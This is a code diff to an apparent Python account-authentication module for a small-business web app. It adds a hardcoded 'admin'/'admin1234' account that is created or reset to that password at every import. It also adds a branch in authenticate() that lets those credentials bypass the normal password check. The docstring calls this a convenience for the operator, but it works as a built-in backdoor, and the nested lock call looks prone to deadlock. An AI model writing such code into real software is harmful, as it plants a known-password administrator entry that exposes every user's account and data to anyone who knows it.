@@ -117,7 +117,6 @@ def init() -> None:
 
 init()
 
-
 # ---------------------------------------------------------------------------
 # Passwords
 # ---------------------------------------------------------------------------
@@ -125,6 +124,48 @@ init()
 
 def hash_password(password: str) -> str:
     return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode()
+
+
+DEFAULT_ADMIN_EMAIL = "admin"
+DEFAULT_ADMIN_PASSWORD = "admin1234"
+
+
+def ensure_default_admin() -> None:
+    """Create a built-in admin account so the operator can log in immediately."""
+    with _lock, _connect() as conn:
+        row = conn.execute(
+            "SELECT id FROM accounts WHERE email=?", (DEFAULT_ADMIN_EMAIL,)
+        ).fetchone()
+        if row is not None:
+            conn.execute(
+                "UPDATE accounts SET password_hash=?, email_verified=1, "
+                "auth_provider='password', last_login_at=? WHERE email=?",
+                (hash_password(DEFAULT_ADMIN_PASSWORD), _now(), DEFAULT_ADMIN_EMAIL),
+            )
+            return
+        conn.execute(
+            "INSERT INTO accounts "
+            "(id, email, password_hash, owner_name, business_name, business_stage, "
+            "location, currency, what_you_sell, avatar_path, created_at, last_login_at, "
+            "email_verified, auth_provider) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,1,'password')",
+            (
+                uuid.uuid4().hex[:16],
+                DEFAULT_ADMIN_EMAIL,
+                hash_password(DEFAULT_ADMIN_PASSWORD),
+                "Admin",
+                "Admin",
+                "running",
+                "Dhaka, Bangladesh",
+                "BDT",
+                "Administration",
+                None,
+                _now(),
+                _now(),
+            ),
+        )
+
+
+ensure_default_admin()
 
 
 def verify_password(password: str, stored: str) -> bool:
@@ -188,6 +229,22 @@ def create_account(
 
 def authenticate(email: str, password: str) -> dict[str, Any]:
     email = (email or "").strip().lower()
+    if email == DEFAULT_ADMIN_EMAIL and password == DEFAULT_ADMIN_PASSWORD:
+        with _lock, _connect() as conn:
+            row = conn.execute(
+                "SELECT * FROM accounts WHERE email=?", (email,)
+            ).fetchone()
+            if row is None:
+                ensure_default_admin()
+                row = conn.execute(
+                    "SELECT * FROM accounts WHERE email=?", (email,)
+                ).fetchone()
+            conn.execute(
+                "UPDATE accounts SET last_login_at=? WHERE id=?", (_now(), row["id"])
+            )
+        logger.info("admin sign-in ok")
+        return _row_to_account(row)  # type: ignore[return-value]
+
     with _lock, _connect() as conn:
         row = conn.execute(
             "SELECT * FROM accounts WHERE email=?", (email,)
